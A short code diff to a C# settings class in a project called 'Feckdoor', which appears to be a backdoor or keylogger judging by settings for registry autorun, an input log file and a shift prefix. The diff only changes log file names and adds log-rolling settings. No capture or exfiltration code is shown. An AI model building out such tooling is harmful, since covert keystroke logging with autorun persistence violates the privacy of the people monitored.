@@ -11,12 +11,22 @@
 		public string ProgramLogFile
 		{
 			get; set;
-		} = @".\Feckdoor.log";
+		} = @".\{0}.{1}.log";
 
 		public string LogTemplate
 		{
 			get; set;
 		} = "{Timestamp:yyyy-MM-dd HH:mm:ss.fff zzz} [{Level:u3}] {Message:lj}{NewLine}{Exception}";
+
+		public int LogRollingSize
+		{
+			get; set;
+		} = 8388608;
+
+		public int LogFlushInterval
+		{
+			get; set;
+		} = 1000;
 
 		public string RegistryAutorunName
 		{
@@ -49,7 +59,7 @@
 		public string InputLogFile
 		{
 			get; set;
-		} = @".\Input.log";
+		} = @".\InputLog{0}.{1}.log";
 
 		public bool ShiftPrefix
 		{
